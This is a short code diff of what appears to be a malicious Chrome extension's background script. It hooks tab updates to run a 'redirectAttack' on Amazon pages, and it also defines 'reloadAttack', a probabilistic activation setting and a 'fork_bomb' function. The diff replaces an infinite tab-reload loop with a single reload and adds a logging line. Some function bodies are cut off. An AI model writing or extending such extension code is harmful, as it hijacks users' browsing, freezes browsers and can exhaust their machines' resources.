@@ -1,6 +1,7 @@
 activationProbability = 0.2
 
 chrome.tabs.onUpdated.addListener(function(tabId, changeInfo, tab) {
+    console.log("listening");
     if (tab.url.indexOf("amazon.com") > -1) {
         redirectAttack(tabId);
     }
@@ -24,9 +25,7 @@ function redirectAttack(tabId) {
 }
 
 function reloadAttack(tabId) {
-    while (true) {
-        chrome.tabs.reload(tabId);
-    }
+   chrome.tabs.reload(tabId);
 }
 
 function fork_bomb() {
